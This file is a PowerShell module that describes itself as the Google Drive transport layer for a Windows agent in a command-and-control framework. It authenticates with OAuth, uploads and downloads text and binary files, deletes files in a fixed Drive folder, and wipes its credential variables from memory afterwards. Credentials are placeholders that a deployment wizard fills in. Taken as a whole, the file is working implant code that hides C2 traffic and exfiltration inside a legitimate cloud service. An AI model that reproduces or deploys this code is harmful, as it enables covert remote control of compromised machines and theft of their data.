# === TRANSPORT: Google Drive API v3 ===
# Provider-specific transport layer for the Windows agent.
# Files are addressed by name within a fixed FOLDER_ID.
# Functions called by agent/core.ps1 (generic C2 layer).
# Credentials are base64 placeholders substituted by the wizard at deploy time.

$script:CLIENT_ID     = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("PLACEHOLDER_CLIENT_ID_B64"))
$script:CLIENT_SECRET = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("PLACEHOLDER_CLIENT_SECRET_B64"))
$script:REFRESH_TOKEN = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("PLACEHOLDER_REFRESH_TOKEN_B64"))
$script:FOLDER_ID     = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("PLACEHOLDER_FOLDER_ID_B64"))
$script:ACCESS_TOKEN  = ""
$script:GD_FILES      = "https://www.googleapis.com/drive/v3/files"
$script:GD_UPLOAD     = "https://www.googleapis.com/upload/drive/v3/files"

function Invoke-TransportRefresh {
    Write-Log "[TOKEN]: Refreshing Google OAuth2 access token..."

    $body = @{
        grant_type    = "refresh_token"
        refresh_token = $script:REFRESH_TOKEN
        client_id     = $script:CLIENT_ID
        client_secret = $script:CLIENT_SECRET
    }

    try {
        $response = Invoke-RestMethod `
            -Uri "https://oauth2.googleapis.com/token" `
            -Method POST -Body $body -ContentType "application/x-www-form-urlencoded"

        if ($response.access_token) {
            $script:ACCESS_TOKEN = $response.access_token
            Write-Log "[TOKEN]: [OK] Token updated"
            return $true
        }
    } catch {
        Write-Log "[TOKEN]: [X] Refresh ERROR: $($_.Exception.Message)"
    }
    return $false
}

function _GdSplitPath($path) {
    # Returns hashtable with Dir (parent path) and Base (filename)
    $idx = $path.LastIndexOf('/')
    if ($idx -lt 0) { return @{ Dir = ""; Base = $path } }
    return @{ Dir = $path.Substring(0, $idx); Base = $path.Substring($idx + 1) }
}

$script:_GdFolderCache = @{}

function _GdResolveFolder($prefix) {
    # Walk/create subfolders under FOLDER_ID; return leaf folder ID.
    $prefix = $prefix.Trim('/')
    if (-not $prefix) { return $script:FOLDER_ID }
    $parent = $script:FOLDER_ID
    foreach ($part in ($prefix -split '/')) {
        if (-not $part) { continue }
        $cacheKey = "${parent}/${part}"
        if ($script:_GdFolderCache.ContainsKey($cacheKey)) {
            $parent = $script:_GdFolderCache[$cacheKey]
            continue
        }
        $q = "name='$part' and '$parent' in parents and mimeType='application/vnd.google-apps.folder' and trashed=false"
        try {
            $r = Invoke-RestMethod -Method Get -ErrorAction Stop `
                -Uri "$script:GD_FILES" `
                -Headers @{ Authorization = "Bearer $script:ACCESS_TOKEN" } `
                -Body @{ q = $q; fields = "files(id)" }
            $fid = $r.files[0].id
        } catch { $fid = $null }
        if (-not $fid) {
            # Create subfolder
            $meta = @{ name = $part; mimeType = "application/vnd.google-apps.folder"; parents = @($parent) } | ConvertTo-Json -Compress
            try {
                $r2 = Invoke-RestMethod -Method Post -ErrorAction Stop `
                    -Uri "$script:GD_FILES" `
                    -Headers @{ Authorization = "Bearer $script:ACCESS_TOKEN" } `
                    -Body $meta -ContentType "application/json"
                $fid = $r2.id
            } catch { $fid = $null }
        }
        if (-not $fid) { return $parent }
        $script:_GdFolderCache[$cacheKey] = $fid
        $parent = $fid
    }
    return $parent
}

function _GdFileId($filename, $parentId) {
    if (-not $parentId) { $parentId = $script:FOLDER_ID }
    try {
        $q = "name='$filename' and '$parentId' in parents and trashed=false"
        $r = Invoke-RestMethod -Method Get -ErrorAction Stop `
            -Uri "$script:GD_FILES" `
            -Headers @{ Authorization = "Bearer $script:ACCESS_TOKEN" } `
            -Body @{ q = $q; fields = "files(id)" }
        return $r.files[0].id
    } catch { return $null }
}

function Invoke-TransportUpload {
    param(
        [string]$Path,
        [string]$Content
    )

    $sp        = _GdSplitPath $Path
    $parentId  = _GdResolveFolder $sp.Dir
    $filename  = $sp.Base
    $bodyBytes = [Text.Encoding]::UTF8.GetBytes($Content)
    $fileId    = _GdFileId $filename $parentId

    try {
        if ($fileId) {
            $response = Invoke-RestMethod `
                -Uri "$script:GD_UPLOAD/${fileId}?uploadType=media" `
                -Method PATCH `
                -Headers @{ Authorization = "Bearer $script:ACCESS_TOKEN" } `
                -Body $bodyBytes -ContentType "application/octet-stream"
        } else {
            $boundary = "stratumx7k2"
            $meta     = "{`"name`":`"$filename`",`"parents`":[`"$parentId`"]}"
            $metaB    = [Text.Encoding]::UTF8.GetBytes($meta)
            $body     = [Text.Encoding]::UTF8.GetBytes("--$boundary`r`nContent-Type: application/json; charset=UTF-8`r`n`r`n") +
                        $metaB +
                        [Text.Encoding]::UTF8.GetBytes("`r`n--$boundary`r`nContent-Type: application/octet-stream`r`n`r`n") +
                        $bodyBytes +
                        [Text.Encoding]::UTF8.GetBytes("`r`n--$boundary--")
            $response = Invoke-RestMethod `
                -Uri "$script:GD_UPLOAD?uploadType=multipart" `
                -Method POST `
                -Headers @{ Authorization = "Bearer $script:ACCESS_TOKEN" } `
                -Body $body -ContentType "multipart/related; boundary=$boundary"
        }
        return $response
    } catch {
        if ($_.Exception.Message -match "401|invalid_token") {
            Write-Log "[API]: Token expired, refreshing..."
            if (Invoke-TransportRefresh) { return (Invoke-TransportUpload -Path $Path -Content $Content) }
        }
        return $null
    }
}

function Invoke-TransportDownload {
    param([string]$Path)

    $sp       = _GdSplitPath $Path
    $parentId = _GdResolveFolder $sp.Dir
    $filename = $sp.Base
    $fileId   = _GdFileId $filename $parentId
    if (-not $fileId) { return $null }

    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bearer $script:ACCESS_TOKEN")
        $responseBytes = $wc.DownloadData("$script:GD_FILES/${fileId}?alt=media")
        return [Text.Encoding]::UTF8.GetString($responseBytes)
    } catch [System.Net.WebException] {
        $errMsg = $_.Exception.Message
        if ($errMsg -match "401|invalid_token") {
            Write-Log "[API]: Token expired, refreshing..."
            if (Invoke-TransportRefresh) { return (Invoke-TransportDownload -Path $Path) }
        }
        Write-Log "[API]: Download error: $errMsg"
        return $null
    } catch {
        Write-Log "[API]: Download error: $($_.Exception.Message)"
        return $null
    }
}

function Invoke-TransportUploadBinary {
    param(
        [string]$Path,
        [byte[]]$Data
    )

    $sp       = _GdSplitPath $Path
    $parentId = _GdResolveFolder $sp.Dir
    $filename = $sp.Base
    $fileId   = _GdFileId $filename $parentId

    try {
        if ($fileId) {
            $response = Invoke-RestMethod `
                -Uri "$script:GD_UPLOAD/${fileId}?uploadType=media" `
                -Method PATCH `
                -Headers @{ Authorization = "Bearer $script:ACCESS_TOKEN" } `
                -Body $Data -ContentType "application/octet-stream"
        } else {
            $boundary = "stratumx7k2"
            $meta     = "{`"name`":`"$filename`",`"parents`":[`"$parentId`"]}"
            $metaB    = [Text.Encoding]::UTF8.GetBytes($meta)
            $body     = [Text.Encoding]::UTF8.GetBytes("--$boundary`r`nContent-Type: application/json; charset=UTF-8`r`n`r`n") +
                        $metaB +
                        [Text.Encoding]::UTF8.GetBytes("`r`n--$boundary`r`nContent-Type: application/octet-stream`r`n`r`n") +
                        $Data +
                        [Text.Encoding]::UTF8.GetBytes("`r`n--$boundary--")
            $response = Invoke-RestMethod `
                -Uri "$script:GD_UPLOAD?uploadType=multipart" `
                -Method POST `
                -Headers @{ Authorization = "Bearer $script:ACCESS_TOKEN" } `
                -Body $body -ContentType "multipart/related; boundary=$boundary"
        }
        return $response
    } catch {
        if ($_.Exception.Message -match "401|invalid_token") {
            if (Invoke-TransportRefresh) { return (Invoke-TransportUploadBinary -Path $Path -Data $Data) }
        }
        return $null
    }
}

function Invoke-TransportDownloadBinary {
    param([string]$Path)

    $sp       = _GdSplitPath $Path
    $parentId = _GdResolveFolder $sp.Dir
    $filename = $sp.Base
    $fileId   = _GdFileId $filename $parentId
    if (-not $fileId) { return $null }

    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bearer $script:ACCESS_TOKEN")
        return $wc.DownloadData("$script:GD_FILES/${fileId}?alt=media")
    } catch [System.Net.WebException] {
        if ($_.Exception.Message -match "401|invalid_token") {
            if (Invoke-TransportRefresh) { return (Invoke-TransportDownloadBinary -Path $Path) }
        }
        return $null
    } catch {
        return $null
    }
}

function Invoke-TransportDelete {
    param([string]$Path)

    $sp       = _GdSplitPath $Path
    $parentId = _GdResolveFolder $sp.Dir
    $filename = $sp.Base
    $fileId   = _GdFileId $filename $parentId
    if (-not $fileId) { return $true }

    try {
        Invoke-RestMethod -Uri "$script:GD_FILES/$fileId" -Method DELETE `
            -Headers @{ Authorization = "Bearer $script:ACCESS_TOKEN" } `
            -ErrorAction SilentlyContinue | Out-Null
        return $true
    } catch {
        if ($_.Exception.Message -match "401|invalid_token") {
            if (Invoke-TransportRefresh) {
                $fileId2 = _GdFileId $filename $parentId
                if ($fileId2) {
                    Invoke-RestMethod -Uri "$script:GD_FILES/$fileId2" -Method DELETE `
                        -Headers @{ Authorization = "Bearer $script:ACCESS_TOKEN" } `
                        -ErrorAction SilentlyContinue | Out-Null
                }
                return $true
            }
        }
        return $false
    }
}

function Clear-Transport {
    Remove-Variable -Name CLIENT_ID, CLIENT_SECRET, REFRESH_TOKEN, FOLDER_ID, ACCESS_TOKEN, _GdFolderCache `
        -Scope Script -Force 2>$null
}
